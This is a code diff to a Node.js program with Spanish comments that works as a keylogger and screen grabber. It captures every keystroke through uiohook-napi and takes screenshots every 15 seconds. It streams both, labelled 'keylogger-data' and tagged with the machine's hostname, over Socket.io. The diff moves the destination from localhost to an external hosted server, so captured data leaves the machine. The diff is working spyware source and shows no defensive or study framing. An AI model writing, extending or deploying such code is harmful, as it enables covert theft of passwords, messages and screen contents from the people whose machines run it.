@@ -12,49 +12,39 @@ else if (uiohookModule.uIOhook) uiohook = uiohookModule.uIOhook;
 else if (uiohookModule.default) uiohook = uiohookModule.default;
 
 if (!uiohook || !uiohook.on) {
-    console.error("❌ Error: No se pudo inicializar uiohook-napi. Revisa la instalación.");
+    console.error("❌ Error: No se pudo inicializar uiohook-napi.");
     process.exit(1);
 }
 
-// --- CONFIGURACIÓN ---
-const args = process.argv.slice(2);
+// --- CONFIGURACIÓN PARA RENDER ---
+// Ya no usamos IP ni Puerto, usamos la URL directa de Render
+const serverUrl = 'https://eamsolutions.onrender.com';
 const config = {
-  server: '127.0.0.1',
-  port: 3001,
   label: os.hostname()
 };
 
-for (let i = 0; i < args.length; i += 2) {
-  const key = args[i].replace('--', '');
-  const value = args[i + 1];
-  if (key && value) config[key] = isNaN(value) ? value : parseInt(value);
-}
+// Conexión segura con Socket.io
+const socket = io(serverUrl, { 
+    transports: ['websocket'],
+    secure: true,
+    reconnection: true
+});
 
-const serverUrl = `http://${config.server}:${config.port}`;
-const socket = io(serverUrl, { transports: ['websocket'] });
+console.log(`\n🚀 AGENTE EAM SOLUTIONS ACTIVO: ${config.label}`);
+console.log(`🔗 CONECTANDO A RENDER: ${serverUrl}\n`);
 
-console.log(`\n🚀 AGENTE ACTIVO: ${config.label}`);
-console.log(`🔗 CONECTANDO A: ${serverUrl}\n`);
-
-// --- LÓGICA DE CAPTURA ---
-
-// Mapeo mejorado de teclas comunes para uiohook
+// --- MAPEO DE TECLAS ---
 const keyMap = {
-    // Teclas de función y control
     1: '[ESC]', 14: '[BORRAR]', 15: '[TAB]', 28: '\n', 29: '[CTRL]', 42: '[SHIFT]', 56: '[ALT]', 57: ' ',
-    // Fila superior (Números)
     2: '1', 3: '2', 4: '3', 5: '4', 6: '5', 7: '6', 8: '7', 9: '8', 10: '9', 11: '0',
-    // Letras - Fila 1
     16: 'Q', 17: 'W', 18: 'E', 19: 'R', 20: 'T', 21: 'Y', 22: 'U', 23: 'I', 24: 'O', 25: 'P',
-    // Letras - Fila 2
     30: 'A', 31: 'S', 32: 'D', 33: 'F', 34: 'G', 35: 'H', 36: 'J', 37: 'K', 38: 'L',
-    // Letras - Fila 3
     44: 'Z', 45: 'X', 46: 'C', 47: 'V', 48: 'B', 49: 'N', 50: 'M',
-    // Navegación
     57416: '[UP]', 57424: '[DOWN]', 57419: '[LEFT]', 57421: '[RIGHT]', 3653: '[SUPR]'
 };
 
-// Función para enviar una sola tecla instantáneamente
+// --- FUNCIONES DE ENVÍO ---
+
 function sendKey(keyChar) {
     if (!socket.connected) return;
     
@@ -62,14 +52,13 @@ function sendKey(keyChar) {
         time: new Date().toISOString(),
         log: keyChar,
         remoteIp: config.label,
-        capture: '' // Las teclas individuales no llevan captura para no saturar
+        capture: '' 
     };
     
     socket.emit('keylogger-data', payload);
-    process.stdout.write(keyChar); // Feedback en tu terminal local
+    process.stdout.write(keyChar); 
 }
 
-// Función para enviar captura de pantalla periódica
 async function sendScreenshot() {
     if (!socket.connected) return;
 
@@ -82,7 +71,7 @@ async function sendScreenshot() {
             capture: img.toString('base64')
         };
         socket.emit('keylogger-data', payload);
-        console.log('\n📸 Captura de pantalla enviada al servidor.');
+        console.log('\n📸 Captura enviada a Render.');
     } catch (err) {
         console.error('\n❌ Error en screenshot:', err.message);
     }
@@ -91,19 +80,25 @@ async function sendScreenshot() {
 // --- EVENTOS ---
 
 uiohook.on('keydown', (event) => {
-    if (event.keycode === 1) cleanup(); // ESC para salir
-
-    // Buscamos en nuestro mapa; si no está, mostramos el código para que puedas agregarlo luego
+    if (event.keycode === 1) cleanup(); 
     let char = keyMap[event.keycode] || `[K${event.keycode}]`;
-    
     sendKey(char);
 });
 
-// Enviar screenshot cada 15 segundos
-setInterval(sendScreenshot, 5000);
+// Enviar captura cada 15 segundos para no saturar el plan gratuito de Render
+setInterval(sendScreenshot, 15000);
 
-socket.on('connect', () => console.log('✅ Conectado al Maestro. Transmitiendo...'));
-socket.on('disconnect', () => console.log('❌ Desconectado del Maestro.'));
+socket.on('connect', () => {
+    console.log('✅ ESTADO: Conectado a Render. Transmitiendo datos...');
+});
+
+socket.on('connect_error', (err) => {
+    console.error('❌ Error de conexión:', err.message);
+});
+
+socket.on('disconnect', () => {
+    console.log('❌ ESTADO: Desconectado de Render.');
+});
 
 function cleanup() {
     try { uiohook.stop(); } catch(e) {}
